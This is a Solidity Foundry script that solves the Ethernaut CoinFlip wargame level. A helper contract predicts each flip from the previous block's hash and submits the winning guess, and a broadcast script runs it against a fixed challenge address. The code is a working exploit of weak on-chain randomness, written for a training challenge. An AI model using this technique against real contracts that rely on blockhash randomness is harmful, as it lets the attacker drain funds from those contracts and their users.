// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/Ethernaut/coinflip.sol";

contract Player {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip public instance;

    constructor(CoinFlip _instance) {
        instance = _instance;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
    }
}

contract CoinFlipScript is Script {
    CoinFlip public instance =
        CoinFlip(0xE28E3e82c356aAC0F1042fF517759a5d224848DE);

    Player public player = Player(0xAefc4521CD54E63571c2580f9f871Ee8d91f156f);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        player.guess();
        console.log("Consecutive wins: %d", instance.consecutiveWins());
        vm.stopBroadcast();
    }
}
